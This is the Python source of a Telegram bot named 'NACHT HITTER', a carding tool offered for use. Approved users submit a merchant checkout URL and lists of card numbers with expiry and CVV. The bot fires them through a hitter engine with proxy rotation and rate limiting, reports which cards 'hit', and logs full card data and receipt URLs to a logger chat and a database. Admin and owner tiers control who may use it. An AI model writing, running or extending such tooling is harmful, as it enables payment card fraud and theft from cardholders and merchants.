#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════╗
║            NACHT HITTER - Telegram Bot           ║
║  Multi-user | Group support | Logger | Proxies   ║
╚══════════════════════════════════════════════════╝

Setup
─────
1. Copy config.sample.json → config.json and fill in your values.
   OR set environment variables: BOT_TOKEN, OWNER_ID.
2. pip install -r requirements.txt && playwright install chromium
3. python3 nacht_bot.py

Commands (visible to all)
─────────────────────────
  /start             – Welcome message
  /help              – Command list (admin commands hidden from non-admins)

Commands (approved users only)
───────────────────────────────
  /hit <url> <cc1> [cc2…cc10]   – Hit a checkout URL
      Card format: number|mm|yy|cvv
  /stats                         – Hit statistics

Commands (admin only — hidden from regular users)
──────────────────────────────────────────────────
  /adduser   <id>    – Approve a user
  /removeuser <id>   – Remove a user
  /addproxy  <proxy> – Add proxy to rotation
  /removeproxy <proxy> – Remove proxy
  /listproxy         – List proxies
  /setlogger [id]    – Set logger chat (omit id = current chat)

Commands (owner only — hidden from admins too)
───────────────────────────────────────────────
  /addadmin  <id>    – Promote user to admin
  /removeadmin <id>  – Demote admin
"""

import asyncio
import json
import logging
import os
import random
import re
import sqlite3
import time
from datetime import datetime
from typing import Dict, List, Optional

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

from nacht import (
    URLAnalyzer, CardGenerator, HitterEngine,
    RateLimiter, init_db, detect_provider,
    DATABASE, MAX_ATTEMPTS,
)

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("nacht_bot")

# ── Config helpers ─────────────────────────────────────────────────────────────
CONFIG_FILE = "config.json"

def _default_cfg() -> Dict:
    return {
        "bot_token":      os.environ.get("BOT_TOKEN", ""),
        "owner_id":       int(os.environ.get("OWNER_ID", "0")),
        "admins":         [],
        "approved_users": [],
        "proxies":        [],
        "logger_chat_id": None,
    }

def load_cfg() -> Dict:
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE) as f:
            cfg = json.load(f)
        for k, v in _default_cfg().items():
            cfg.setdefault(k, v)
        return cfg
    cfg = _default_cfg()
    save_cfg(cfg)
    return cfg

def save_cfg(cfg: Dict):
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=2)

CFG = load_cfg()

# ── Permission helpers ────────────────────────────────────────────────────────
def is_owner(uid: int) -> bool:   return uid == CFG["owner_id"]
def is_admin(uid: int) -> bool:   return is_owner(uid) or uid in CFG["admins"]
def is_approved(uid: int) -> bool:return is_admin(uid) or uid in CFG["approved_users"]

# ── Active job tracking (one per chat) ───────────────────────────────────────
_jobs: Dict[int, asyncio.Task] = {}

# ── Telegram helpers ──────────────────────────────────────────────────────────
async def _log(app: Application, text: str):
    lid = CFG.get("logger_chat_id")
    if lid:
        try:
            await app.bot.send_message(chat_id=lid, text=text, parse_mode=ParseMode.HTML)
        except Exception as e:
            log.warning(f"Logger error: {e}")

def _bar(cur: int, total: int, w: int = 20) -> str:
    f = int(w * cur / total) if total else 0
    return "█" * f + "░" * (w - f)

async def _edit(context: ContextTypes.DEFAULT_TYPE, chat_id: int, msg_id: int, text: str):
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text=text, parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass

# ─────────────────────────────────────────────────────────────────────────────
# /start
# ─────────────────────────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = update.effective_user.first_name
    await update.message.reply_text(
        f"⚡ <b>NACHT HITTER</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n\n"
        f"👋 Welcome, <b>{name}</b>!\n\n"
        f"Use /help to see available commands.",
        parse_mode=ParseMode.HTML,
    )

# ─────────────────────────────────────────────────────────────────────────────
# /help
# ─────────────────────────────────────────────────────────────────────────────
async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    lines = [
        "⚡ <b>NACHT HITTER — Commands</b>",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
        "",
        "<b>User Commands</b>",
        "/hit &lt;url&gt; &lt;cc1&gt; [cc2 … max 10]",
        "  Card format: <code>number|mm|yy|cvv</code>",
        "/stats — Hit statistics",
        "/help  — This message",
    ]
    if is_admin(uid):
        lines += [
            "",
            "<b>Admin Commands</b>",
            "/adduser &lt;id&gt;     — Approve user",
            "/removeuser &lt;id&gt;  — Remove user",
            "/addproxy &lt;proxy&gt; — Add proxy",
            "/removeproxy &lt;proxy&gt; — Remove proxy",
            "/listproxy           — List proxies",
            "/setlogger [id]      — Set logger chat",
        ]
    if is_owner(uid):
        lines += [
            "",
            "<b>Owner Commands</b>",
            "/addadmin &lt;id&gt;    — Add admin",
            "/removeadmin &lt;id&gt; — Remove admin",
        ]
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)

# ─────────────────────────────────────────────────────────────────────────────
# /hit
# ─────────────────────────────────────────────────────────────────────────────
async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid     = update.effective_user.id
    chat_id = update.effective_chat.id

    if not is_approved(uid):
        await update.message.reply_text(
            "⛔ <b>Access Denied</b>\n"
            "You are not approved. Ask an admin to add you.",
            parse_mode=ParseMode.HTML,
        )
        return

    args = context.args or []
    if len(args) < 2:
        await update.message.reply_text(
            "❌ <b>Usage:</b>\n"
            "<code>/hit &lt;url&gt; &lt;cc1&gt; [cc2 … max 10]</code>\n\n"
            "Card format: <code>number|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    url = args[0]
    cards: List[Dict] = []
    bad: List[str] = []
    for cs in args[1:11]:
        c = CardGenerator.parse(cs)
        if c:
            cards.append(c)
        else:
            bad.append(cs)

    if not cards:
        await update.message.reply_text(
            "❌ No valid cards.\nFormat: <code>number|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    if chat_id in _jobs and not _jobs[chat_id].done():
        await update.message.reply_text("⚠️ A hit job is already running here. Wait for it to finish.")
        return

    status = await update.message.reply_text(
        f"🔍 <b>Analyzing URL…</b>\n<code>{url[:80]}</code>",
        parse_mode=ParseMode.HTML,
    )
    task = asyncio.create_task(
        _hit_job(update, context, url, cards, bad, status.message_id)
    )
    _jobs[chat_id] = task

async def _hit_job(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    url: str,
    cards: List[Dict],
    bad: List[str],
    status_id: int,
):
    chat_id = update.effective_chat.id
    user    = update.effective_user
    app     = context.application

    # ── Analyze URL ──────────────────────────────────────────────────────────
    try:
        info = await URLAnalyzer.analyze(url, use_playwright=False)
        if info["merchant"] == "Unknown" or info["product"] in (
            "Unknown", "Stripe Checkout", "Checkout", "Shopify Checkout"
        ):
            await _edit(context, chat_id, status_id,
                        "🔍 <b>Trying deep analysis…</b>")
            info = await URLAnalyzer.analyze(url, use_playwright=True)
    except Exception as e:
        info = {
            "url": url, "merchant": "Unknown", "product": "Unknown",
            "amount": None, "currency": "USD", "product_url": None, "success": False,
        }
        log.warning(f"URL analyze error: {e}")

    merchant  = info.get("merchant", "Unknown")
    product   = info.get("product",  "Unknown")
    amount    = info.get("amount")    or "N/A"
    currency  = info.get("currency")  or "USD"
    provider  = detect_provider(url)

    proxy = random.choice(CFG["proxies"]) if CFG["proxies"] else None

    header = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ <b>NACHT HITTER — STARTED</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔗 <b>URL:</b> <code>{url[:70]}</code>\n"
        f"🏢 <b>Merchant:</b> {merchant}\n"
        f"📦 <b>Product:</b> {product}\n"
        f"💰 <b>Amount:</b> {amount} {currency}\n"
        f"🔌 <b>Provider:</b> {provider}\n"
        f"💳 <b>Cards:</b> {len(cards)}"
    )
    if bad:
        header += f"\n⚠️ <b>Skipped (invalid):</b> {len(bad)}"
    if proxy:
        header += f"\n🔒 <b>Proxy:</b> <code>{proxy}</code>"
    header += "\n\n⏳ Processing…"

    await _edit(context, chat_id, status_id, header)

    # ── Run hits ──────────────────────────────────────────────────────────────
    engine  = HitterEngine(proxy=proxy)
    rl      = RateLimiter()
    total   = min(len(cards), MAX_ATTEMPTS)
    lines:  List[str] = []

    for i, card in enumerate(cards[:total]):
        cdisp = f"{card['card']}|{card['month']}|{card['year']}|{card['cvv']}"

        if i > 0:
            prev_ok = bool(engine.results and engine.results[-1].get("success"))
            await asyncio.sleep(rl.next(prev_ok))

        # live progress
        bar = _bar(i, total)
        prog = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ <b>NACHT HITTER — RUNNING</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🏢 {merchant}  💰 {amount} {currency}\n\n"
            f"<code>[{bar}]</code>  {i}/{total}\n"
            f"✅ <b>Hit:</b> {engine.successes}   ❌ <b>Declined:</b> {engine.fails}\n\n"
            f"⏳ Testing: <code>{cdisp}</code>"
        )
        await _edit(context, chat_id, status_id, prog)

        res = await engine.hit(url, card, merchant, product, amount, i + 1)

        # per-card log to logger group
        if res.get("success"):
            line = (
                f"✅ <b>HIT!</b>  <code>{cdisp}</code>\n"
                f"   🔗 {res.get('receipt_url','N/A')}\n"
                f"   ⏱ {res['response_time']:.1f}s"
            )
            await _log(app,
                f"🟢 <b>NACHT — HIT</b>\n"
                f"👤 {user.mention_html()}\n"
                f"💳 <code>{cdisp}</code>\n"
                f"🏢 {merchant}  📦 {product}\n"
                f"💰 {amount} {currency}\n"
                f"🔗 {res.get('receipt_url','N/A')}\n"
                f"⏱ {res['response_time']:.2f}s"
            )
        else:
            code = res.get("decline_code") or res.get("error") or "unknown"
            line = (
                f"❌ <b>Declined:</b>  <code>{cdisp}</code>\n"
                f"   📉 {code}  ⏱ {res['response_time']:.1f}s"
            )
            await _log(app,
                f"🔴 <b>NACHT — DECLINED</b>\n"
                f"👤 {user.mention_html()}\n"
                f"💳 <code>{cdisp}</code>\n"
                f"🏢 {merchant}\n"
                f"📉 {code}  ⏱ {res['response_time']:.2f}s"
            )
        lines.append(line)

        # save to DB
        try:
            conn = sqlite3.connect(DATABASE)
            conn.execute(
                """INSERT INTO hits
                   (timestamp,user_id,card,merchant,product,amount,
                    success,decline_code,receipt_url,response_time)
                   VALUES(?,?,?,?,?,?,?,?,?,?)""",
                (datetime.now().isoformat(), user.id, cdisp,
                 merchant, product, amount,
                 1 if res.get("success") else 0,
                 res.get("decline_code", ""),
                 res.get("receipt_url", ""),
                 res.get("response_time", 0)),
            )
            conn.commit(); conn.close()
        except Exception as e:
            log.warning(f"DB error: {e}")

    # ── Final summary ────────────────────────────────────────────────────────
    done  = engine.successes + engine.fails
    rate  = (engine.successes / done * 100) if done else 0
    bar   = _bar(total, total)

    summary = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🏁 <b>NACHT HITTER — DONE</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🏢 <b>{merchant}</b>  |  📦 {product}\n"
        f"💰 {amount} {currency}\n\n"
        f"<code>[{bar}]</code>  {total}/{total}\n\n"
        f"✅ <b>Hits:</b> {engine.successes}\n"
        f"❌ <b>Declined:</b> {engine.fails}\n"
        f"📊 <b>Success Rate:</b> {rate:.1f}%\n\n"
        "━━━ <b>Results</b> ━━━\n"
    )

    body = "\n".join(lines)
    if len(summary) + len(body) > 3800:
        body = "\n".join(lines[:10]) + "\n…(more)"
    summary += body

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=status_id,
            text=summary, parse_mode=ParseMode.HTML,
        )
    except Exception:
        await context.bot.send_message(chat_id=chat_id, text=summary, parse_mode=ParseMode.HTML)

    await _log(app,
        f"📋 <b>NACHT — JOB DONE</b>\n"
        f"👤 {user.mention_html()}\n"
        f"🔗 {url[:70]}\n"
        f"✅ {engine.successes} hits / ❌ {engine.fails} declined / 📊 {rate:.1f}%"
    )

# ─────────────────────────────────────────────────────────────────────────────
# /stats
# ─────────────────────────────────────────────────────────────────────────────
async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid):
        await update.message.reply_text("⛔ Access denied."); return
    try:
        conn = sqlite3.connect(DATABASE)
        total    = conn.execute("SELECT COUNT(*) FROM hits").fetchone()[0]
        hits     = conn.execute("SELECT COUNT(*) FROM hits WHERE success=1").fetchone()[0]
        declined = conn.execute("SELECT COUNT(*) FROM hits WHERE success=0").fetchone()[0]
        conn.close()
    except Exception:
        total = hits = declined = 0
    rate = (hits / total * 100) if total else 0
    await update.message.reply_text(
        "📊 <b>NACHT HITTER — Stats</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔢 Total:    {total}\n"
        f"✅ Hits:     {hits}\n"
        f"❌ Declined: {declined}\n"
        f"📈 Rate:     {rate:.1f}%",
        parse_mode=ParseMode.HTML,
    )

# ─────────────────────────────────────────────────────────────────────────────
# Admin: user management
# ─────────────────────────────────────────────────────────────────────────────
async def cmd_adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return  # silently ignore — not visible to non-admins
    if not context.args:
        await update.message.reply_text("Usage: /adduser <id>"); return
    try:
        nid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid ID."); return
    if nid not in CFG["approved_users"]:
        CFG["approved_users"].append(nid); save_cfg(CFG)
        await update.message.reply_text(f"✅ User <code>{nid}</code> approved.", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(f"ℹ️ Already approved.", parse_mode=ParseMode.HTML)

async def cmd_removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /removeuser <id>"); return
    try:
        nid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid ID."); return
    if nid in CFG["approved_users"]:
        CFG["approved_users"].remove(nid); save_cfg(CFG)
        await update.message.reply_text(f"✅ User <code>{nid}</code> removed.", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("ℹ️ Not in approved list.")

# ─────────────────────────────────────────────────────────────────────────────
# Owner: admin management
# ─────────────────────────────────────────────────────────────────────────────
async def cmd_addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /addadmin <id>"); return
    try:
        nid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid ID."); return
    if nid not in CFG["admins"]:
        CFG["admins"].append(nid); save_cfg(CFG)
        await update.message.reply_text(f"✅ Admin <code>{nid}</code> added.", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("ℹ️ Already admin.")

async def cmd_removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /removeadmin <id>"); return
    try:
        nid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid ID."); return
    if nid in CFG["admins"]:
        CFG["admins"].remove(nid); save_cfg(CFG)
        await update.message.reply_text(f"✅ Admin <code>{nid}</code> removed.", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("ℹ️ Not an admin.")

# ─────────────────────────────────────────────────────────────────────────────
# Admin: proxy management
# ─────────────────────────────────────────────────────────────────────────────
async def cmd_addproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text(
            "Usage: /addproxy &lt;proxy&gt;\n"
            "Formats: <code>host:port</code> or <code>user:pass@host:port</code>",
            parse_mode=ParseMode.HTML,
        ); return
    p = context.args[0].strip()
    if p not in CFG["proxies"]:
        CFG["proxies"].append(p); save_cfg(CFG)
        await update.message.reply_text(f"✅ Proxy added: <code>{p}</code>", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(f"ℹ️ Already exists: <code>{p}</code>", parse_mode=ParseMode.HTML)

async def cmd_removeproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /removeproxy <proxy>"); return
    p = context.args[0].strip()
    if p in CFG["proxies"]:
        CFG["proxies"].remove(p); save_cfg(CFG)
        await update.message.reply_text(f"✅ Proxy removed: <code>{p}</code>", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(f"ℹ️ Not found: <code>{p}</code>", parse_mode=ParseMode.HTML)

async def cmd_listproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not CFG["proxies"]:
        await update.message.reply_text("ℹ️ No proxies configured."); return
    lines = ["🔒 <b>Proxy List</b>", "━━━━━━━━━━━━━━━━━"]
    for i, p in enumerate(CFG["proxies"], 1):
        lines.append(f"{i}. <code>{p}</code>")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)

# ─────────────────────────────────────────────────────────────────────────────
# Admin: logger
# ─────────────────────────────────────────────────────────────────────────────
async def cmd_setlogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if context.args:
        try:
            lid = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ Invalid ID."); return
    else:
        lid = update.effective_chat.id
    CFG["logger_chat_id"] = lid; save_cfg(CFG)
    await update.message.reply_text(
        f"✅ Logger set to: <code>{lid}</code>", parse_mode=ParseMode.HTML
    )

# ─────────────────────────────────────────────────────────────────────────────
# Fallback for unknown commands
# ─────────────────────────────────────────────────────────────────────────────
async def cmd_unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Only reply in private chats to avoid group noise
    if update.effective_chat.type == "private":
        await update.message.reply_text("❓ Unknown command. Use /help.")

# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────
def main():
    token = CFG.get("bot_token") or os.environ.get("BOT_TOKEN", "")
    if not token:
        print("ERROR: BOT_TOKEN not set. Add it to config.json or set env var BOT_TOKEN.")
        return
    if not CFG.get("owner_id"):
        print("WARNING: OWNER_ID not set. Set it in config.json or env var OWNER_ID.")

    init_db()

    app = Application.builder().token(token).build()

    # Public
    app.add_handler(CommandHandler("start",       cmd_start))
    app.add_handler(CommandHandler("help",        cmd_help))

    # Approved users
    app.add_handler(CommandHandler("hit",         cmd_hit))
    app.add_handler(CommandHandler("stats",       cmd_stats))

    # Admin only (silently ignored for others)
    app.add_handler(CommandHandler("adduser",     cmd_adduser))
    app.add_handler(CommandHandler("removeuser",  cmd_removeuser))
    app.add_handler(CommandHandler("addproxy",    cmd_addproxy))
    app.add_handler(CommandHandler("removeproxy", cmd_removeproxy))
    app.add_handler(CommandHandler("listproxy",   cmd_listproxy))
    app.add_handler(CommandHandler("setlogger",   cmd_setlogger))

    # Owner only (silently ignored for others)
    app.add_handler(CommandHandler("addadmin",    cmd_addadmin))
    app.add_handler(CommandHandler("removeadmin", cmd_removeadmin))

    # Unknown commands (private only)
    app.add_handler(MessageHandler(filters.COMMAND, cmd_unknown))

    print("⚡ NACHT HITTER Bot starting…")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
